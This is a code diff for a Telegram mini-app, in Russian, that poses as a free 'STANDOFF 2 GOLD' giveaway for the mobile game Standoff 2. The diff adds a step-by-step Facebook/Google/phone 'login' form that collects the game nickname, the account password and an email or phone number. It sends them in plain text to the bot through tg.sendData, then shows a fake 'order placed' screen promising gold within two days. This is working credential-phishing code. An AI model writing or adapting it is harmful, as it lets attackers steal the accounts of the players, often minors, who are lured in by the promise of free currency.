@@ -25,7 +25,7 @@
             padding: 20px;
         }
 
-        /* Шапка как в Hamster Kombat */
+        /* Шапка */
         .header {
             text-align: center;
             margin-bottom: 30px;
@@ -38,13 +38,13 @@
         }
 
         .gold-icon {
-            font-size: 100px;
+            font-size: 80px;
             filter: drop-shadow(0 0 20px gold);
             margin-bottom: 10px;
         }
 
         h1 {
-            font-size: 32px;
+            font-size: 28px;
             background: linear-gradient(45deg, #ffd700, #ffa500);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -53,27 +53,20 @@
             letter-spacing: 2px;
         }
 
-        .balance {
-            background: rgba(255, 215, 0, 0.1);
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            border-radius: 20px;
-            padding: 10px 20px;
-            display: inline-block;
-            margin-top: 10px;
+        /* Экран выбора метода */
+        .methods-screen {
+            display: block;
         }
 
-        .balance-text {
-            font-size: 14px;
-            color: #ffd700;
+        .form-screen {
+            display: none;
         }
 
-        .balance-amount {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ffd700;
+        .success-screen {
+            display: none;
+            text-align: center;
         }
 
-        /* Карточки методов входа */
         .methods-title {
             font-size: 18px;
             margin: 20px 0 15px;
@@ -133,135 +126,330 @@
             font-size: 20px;
         }
 
-        /* Информационная карточка */
-        .info-card {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 20px;
-            padding: 20px;
-            margin-top: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .info-title {
+        /* Форма в стиле Google */
+        .form-header {
             display: flex;
             align-items: center;
             gap: 10px;
-            font-size: 16px;
+            margin-bottom: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 15px;
+        }
+
+        .back-button {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            font-size: 24px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .method-indicator {
+            flex: 1;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.1);
+            z-index: 1;
+        }
+
+        .step {
+            position: relative;
+            z-index: 2;
+            background: #1a1a2e;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            font-weight: bold;
+        }
+
+        .step.active {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.2);
             color: #ffd700;
-            margin-bottom: 15px;
         }
 
-        .info-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 12px;
-            color: #e0e0e0;
+        .step.completed {
+            border-color: #4caf50;
+            background: rgba(76, 175, 80, 0.2);
+            color: #4caf50;
+        }
+
+        .step-label {
+            position: absolute;
+            top: 45px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 10px;
+            white-space: nowrap;
+            color: #a0a0a0;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a0a0a0;
             font-size: 14px;
         }
 
-        .info-item span {
-            color: #ffd700;
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
         }
 
-        /* Кнопка как в Hamster Kombat */
-        .tap-button {
+        .form-input:focus {
+            outline: none;
+            border-color: #ffd700;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .next-button {
+            width: 100%;
+            padding: 18px;
             background: linear-gradient(45deg, #ffd700, #ffa500);
             border: none;
-            border-radius: 100px;
-            padding: 20px;
-            width: 100%;
-            font-size: 24px;
-            font-weight: bold;
+            border-radius: 12px;
             color: #1a1a2e;
-            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
+            margin-top: 20px;
         }
 
-        .tap-button:hover {
+        .next-button:hover {
             transform: scale(0.98);
-            box-shadow: 0 5px 10px rgba(255, 215, 0, 0.4);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
         }
 
-        .tap-button:active {
-            transform: scale(0.95);
+        .next-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
-        .footer {
+        .info-text {
             text-align: center;
             margin-top: 20px;
-            color: #666;
+            color: #a0a0a0;
             font-size: 12px;
+        }
+
+        /* Экран успеха */
+        .success-icon {
+            font-size: 80px;
+            margin: 40px 0 20px;
+            animation: bounce 1s;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .success-title {
+            font-size: 24px;
+            color: #ffd700;
+            margin-bottom: 10px;
+        }
+
+        .success-text {
+            color: #a0a0a0;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .success-details {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .detail-label {
+            color: #a0a0a0;
+        }
+
+        .detail-value {
+            color: #ffd700;
+            font-weight: 600;
+        }
+
+        .close-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #ffd700, #ffa500);
+            border: none;
+            border-radius: 12px;
+            color: #1a1a2e;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Шапка как в Hamster Kombat -->
-        <div class="header">
-            <div class="gold-icon">🪙</div>
-            <h1>STANDOFF 2 GOLD</h1>
-            <div class="balance">
-                <div class="balance-text">Доступно голды</div>
-                <div class="balance-amount">10 000 🪙</div>
+        <!-- Экран выбора метода -->
+        <div id="methodsScreen" class="methods-screen">
+            <div class="header">
+                <div class="gold-icon">🪙</div>
+                <h1>STANDOFF 2 GOLD</h1>
+            </div>
+
+            <div class="methods-title">ВОЙТИ ЧЕРЕЗ</div>
+
+            <div class="method-card" onclick="selectMethod('Facebook')">
+                <div class="method-icon">📘</div>
+                <div class="method-info">
+                    <div class="method-name">Facebook</div>
+                    <div class="method-desc">Быстрый вход через аккаунт Facebook</div>
+                </div>
+                <div class="method-arrow">→</div>
+            </div>
+
+            <div class="method-card" onclick="selectMethod('Google')">
+                <div class="method-icon">🔵</div>
+                <div class="method-info">
+                    <div class="method-name">Google</div>
+                    <div class="method-desc">Вход через Google аккаунт</div>
+                </div>
+                <div class="method-arrow">→</div>
+            </div>
+
+            <div class="method-card" onclick="selectMethod('Номер телефона')">
+                <div class="method-icon">📱</div>
+                <div class="method-info">
+                    <div class="method-name">Номер телефона</div>
+                    <div class="method-desc">Вход по номеру телефона</div>
+                </div>
+                <div class="method-arrow">→</div>
+            </div>
+
+            <div class="info-card" style="margin-top: 30px; background: rgba(0,0,0,0.3); border-radius: 15px; padding: 15px;">
+                <div style="display: flex; gap: 10px; color: #a0a0a0; font-size: 14px;">
+                    <span>ℹ️</span>
+                    <span>Выберите способ входа для получения голды</span>
+                </div>
             </div>
         </div>
 
-        <!-- Методы входа -->
-        <div class="methods-title">ВОЙТИ ЧЕРЕЗ</div>
-
-        <div class="method-card" onclick="selectMethod('facebook')">
-            <div class="method-icon">📘</div>
-            <div class="method-info">
-                <div class="method-name">Facebook</div>
-                <div class="method-desc">Быстрый вход через аккаунт Facebook</div>
+        <!-- Экран формы ввода (стиль Google) -->
+        <div id="formScreen" class="form-screen">
+            <div class="form-header">
+                <button class="back-button" onclick="backToMethods()">←</button>
+                <div class="method-indicator" id="selectedMethod">Facebook</div>
             </div>
-            <div class="method-arrow">→</div>
+
+            <!-- Индикатор шагов -->
+            <div class="step-indicator">
+                <div class="step active" id="step1">1<span class="step-label">Никнейм</span></div>
+                <div class="step" id="step2">2<span class="step-label">Пароль</span></div>
+                <div class="step" id="step3">3<span class="step-label" id="step3Label">Данные</span></div>
+            </div>
+
+            <!-- Шаг 1: Никнейм -->
+            <div id="step1Content">
+                <div class="form-group">
+                    <label class="form-label">🎮 Никнейм в Standoff 2</label>
+                    <input type="text" class="form-input" id="nickname" placeholder="Введите ваш никнейм" oninput="validateStep1()">
+                </div>
+                <button class="next-button" id="nextBtn1" onclick="nextStep()" disabled>Продолжить</button>
+            </div>
+
+            <!-- Шаг 2: Пароль (скрыт) -->
+            <div id="step2Content" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label">🔐 Пароль от аккаунта</label>
+                    <input type="password" class="form-input" id="password" placeholder="Введите пароль" oninput="validateStep2()">
+                </div>
+                <button class="next-button" id="nextBtn2" onclick="nextStep()" disabled>Продолжить</button>
+            </div>
+
+            <!-- Шаг 3: Дополнительные данные (скрыт, меняется в зависимости от метода) -->
+            <div id="step3Content" style="display: none;">
+                <div class="form-group">
+                    <label class="form-label" id="step3LabelField">📧 Email или телефон</label>
+                    <input type="text" class="form-input" id="additionalData" placeholder="" oninput="validateStep3()">
+                </div>
+                <button class="next-button" id="nextBtn3" onclick="submitForm()" disabled>Отправить</button>
+            </div>
+
+            <div class="info-text" id="formInfo">
+                Введите данные для входа в аккаунт
+            </div>
         </div>
 
-        <div class="method-card" onclick="selectMethod('google')">
-            <div class="method-icon">🔵</div>
-            <div class="method-info">
-                <div class="method-name">Google</div>
-                <div class="method-desc">Вход через Google аккаунт</div>
+        <!-- Экран успеха -->
+        <div id="successScreen" class="success-screen">
+            <div class="success-icon">✅</div>
+            <div class="success-title">ЗАКАЗ ОФОРМЛЕН!</div>
+            <div class="success-text">
+                🪙 Ваша голда поступит в течение 2 дней<br>
+                на ваш аккаунт
             </div>
-            <div class="method-arrow">→</div>
-        </div>
-
-        <div class="method-card" onclick="selectMethod('phone')">
-            <div class="method-icon">📱</div>
-            <div class="method-info">
-                <div class="method-name">Номер телефона</div>
-                <div class="method-desc">Вход по номеру телефона</div>
+            <div class="success-details" id="successDetails">
+                <!-- Данные будут вставлены через JS -->
             </div>
-            <div class="method-arrow">→</div>
-        </div>
-
-        <!-- Информация -->
-        <div class="info-card">
-            <div class="info-title">
-                <span>ℹ️</span> Как получить голду?
-            </div>
-            <div class="info-item">
-                <span>1.</span> Выберите способ входа
-            </div>
-            <div class="info-item">
-                <span>2.</span> Введите данные аккаунта
-            </div>
-            <div class="info-item">
-                <span>3.</span> Голда зачислится в течение 2 дней
-            </div>
-        </div>
-
-        <!-- Кнопка как в Hamster Kombat -->
-        <button class="tap-button" onclick="tapGold()">
-            👆 TAP TO GET GOLD
-        </button>
-
-        <div class="footer">
-            Standoff 2 Gold • Официальный бот
+            <button class="close-button" onclick="closeApp()">Закрыть</button>
         </div>
     </div>
 
@@ -270,50 +458,194 @@
         tg.expand();
         tg.ready();
 
-        // Функция выбора метода входа
+        let currentMethod = '';
+        let userData = {
+            nickname: '',
+            password: '',
+            additionalData: ''
+        };
+
+        // Функция выбора метода
         function selectMethod(method) {
-            let methodName = '';
-            let methodEmoji = '';
-
-            switch(method) {
-                case 'facebook':
-                    methodName = 'Facebook';
-                    methodEmoji = '📘';
-                    break;
-                case 'google':
-                    methodName = 'Google';
-                    methodEmoji = '🔵';
-                    break;
-                case 'phone':
-                    methodName = 'Номер телефона';
-                    methodEmoji = '📱';
-                    break;
+            currentMethod = method;
+            document.getElementById('selectedMethod').textContent = method;
+            
+            // Меняем подпись для третьего шага в зависимости от метода
+            let step3Label = document.getElementById('step3Label');
+            let step3LabelField = document.getElementById('step3LabelField');
+            let additionalInput = document.getElementById('additionalData');
+            
+            if (method === 'Facebook') {
+                step3Label.textContent = 'Email/Phone';
+                step3LabelField.textContent = '📧 Email или номер телефона Facebook';
+                additionalInput.placeholder = 'example@gmail.com или +380...';
+            } else if (method === 'Google') {
+                step3Label.textContent = 'Gmail';
+                step3LabelField.textContent = '✉️ Google email';
+                additionalInput.placeholder = 'example@gmail.com';
+            } else if (method === 'Номер телефона') {
+                step3Label.textContent = 'Телефон';
+                step3LabelField.textContent = '☎️ Номер телефона';
+                additionalInput.placeholder = '+380 XX XXX XX XX';
             }
-
-            // Отправляем данные в бот
-            tg.sendData(JSON.stringify({
-                action: 'select_method',
-                method: methodName,
-                emoji: methodEmoji
-            }));
-
-            // Показываем уведомление
-            tg.showAlert(`Вы выбрали вход через ${methodName}`);
+            
+            // Показываем экран формы
+            document.getElementById('methodsScreen').style.display = 'none';
+            document.getElementById('formScreen').style.display = 'block';
+            
+            // Сбрасываем шаги
+            resetForm();
         }
 
-        // Функция для тапа (как в Hamster Kombat)
-        function tapGold() {
-            // Создаем анимацию тапа
-            const button = document.querySelector('.tap-button');
-            button.style.transform = 'scale(0.95)';
+        // Возврат к выбору метода
+        function backToMethods() {
+            document.getElementById('methodsScreen').style.display = 'block';
+            document.getElementById('formScreen').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'none';
+            resetForm();
+        }
 
-            setTimeout(() => {
-                button.style.transform = 'scale(1)';
-            }, 100);
+        // Сброс формы
+        function resetForm() {
+            // Показываем первый шаг
+            document.getElementById('step1Content').style.display = 'block';
+            document.getElementById('step2Content').style.display = 'none';
+            document.getElementById('step3Content').style.display = 'none';
+            
+            // Сбрасываем индикаторы
+            document.getElementById('step1').className = 'step active';
+            document.getElementById('step2').className = 'step';
+            document.getElementById('step3').className = 'step';
+            
+            // Очищаем поля
+            document.getElementById('nickname').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('additionalData').value = '';
+            
+            // Сбрасываем кнопки
+            document.getElementById('nextBtn1').disabled = true;
+            document.getElementById('nextBtn2').disabled = true;
+            document.getElementById('nextBtn3').disabled = true;
+            
+            // Сбрасываем данные
+            userData = { nickname: '', password: '', additionalData: '' };
+            
+            document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
+        }
 
-            // Показываем уведомление
-            tg.HapticFeedback.impactOccurred('heavy');
-            tg.showAlert('🪙 Начните с выбора метода входа!');
+        // Валидация шага 1
+        function validateStep1() {
+            const nickname = document.getElementById('nickname').value;
+            document.getElementById('nextBtn1').disabled = nickname.length < 3;
+        }
+
+        // Валидация шага 2
+        function validateStep2() {
+            const password = document.getElementById('password').value;
+            document.getElementById('nextBtn2').disabled = password.length < 4;
+        }
+
+        // Валидация шага 3
+        function validateStep3() {
+            const additional = document.getElementById('additionalData').value;
+            let isValid = false;
+            
+            if (currentMethod === 'Google') {
+                isValid = additional.includes('@gmail.com');
+            } else if (currentMethod === 'Номер телефона') {
+                isValid = additional.length >= 10;
+            } else {
+                isValid = additional.length >= 3;
+            }
+            
+            document.getElementById('nextBtn3').disabled = !isValid;
+            
+            if (currentMethod === 'Google' && !isValid && additional.length > 0) {
+                document.getElementById('formInfo').textContent = 'Email должен содержать @gmail.com';
+            } else {
+                document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
+            }
+        }
+
+        // Переход к следующему шагу
+        function nextStep() {
+            if (document.getElementById('step1Content').style.display !== 'none') {
+                // Шаг 1 -> Шаг 2
+                userData.nickname = document.getElementById('nickname').value;
+                
+                document.getElementById('step1Content').style.display = 'none';
+                document.getElementById('step2Content').style.display = 'block';
+                
+                document.getElementById('step1').className = 'step completed';
+                document.getElementById('step2').className = 'step active';
+                
+                document.getElementById('formInfo').textContent = 'Введите пароль от аккаунта';
+                
+            } else if (document.getElementById('step2Content').style.display !== 'none') {
+                // Шаг 2 -> Шаг 3
+                userData.password = document.getElementById('password').value;
+                
+                document.getElementById('step2Content').style.display = 'none';
+                document.getElementById('step3Content').style.display = 'block';
+                
+                document.getElementById('step2').className = 'step completed';
+                document.getElementById('step3').className = 'step active';
+                
+                let stepText = '';
+                if (currentMethod === 'Facebook') stepText = 'Введите email или телефон Facebook';
+                else if (currentMethod === 'Google') stepText = 'Введите Gmail';
+                else stepText = 'Введите номер телефона';
+                
+                document.getElementById('formInfo').textContent = stepText;
+            }
+        }
+
+        // Отправка формы
+        function submitForm() {
+            userData.additionalData = document.getElementById('additionalData').value;
+            
+            // Показываем экран успеха
+            document.getElementById('formScreen').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+            
+            // Заполняем детали
+            const detailsHtml = `
+                <div class="detail-item">
+                    <span class="detail-label">Метод входа:</span>
+                    <span class="detail-value">${currentMethod}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Никнейм:</span>
+                    <span class="detail-value">${userData.nickname}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Пароль:</span>
+                    <span class="detail-value">${'•'.repeat(userData.password.length)}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Доп. данные:</span>
+                    <span class="detail-value">${userData.additionalData}</span>
+                </div>
+            `;
+            
+            document.getElementById('successDetails').innerHTML = detailsHtml;
+            
+            // Отправляем данные в бота
+            tg.sendData(JSON.stringify({
+                action: 'submit_form',
+                method: currentMethod,
+                nickname: userData.nickname,
+                password: userData.password,
+                additionalData: userData.additionalData
+            }));
+            
+            // Вибрация
+            tg.HapticFeedback.notificationOccurred('success');
+        }
+
+        // Закрытие приложения
+        function closeApp() {
+            tg.close();
         }
 
         // Обработка данных из бота
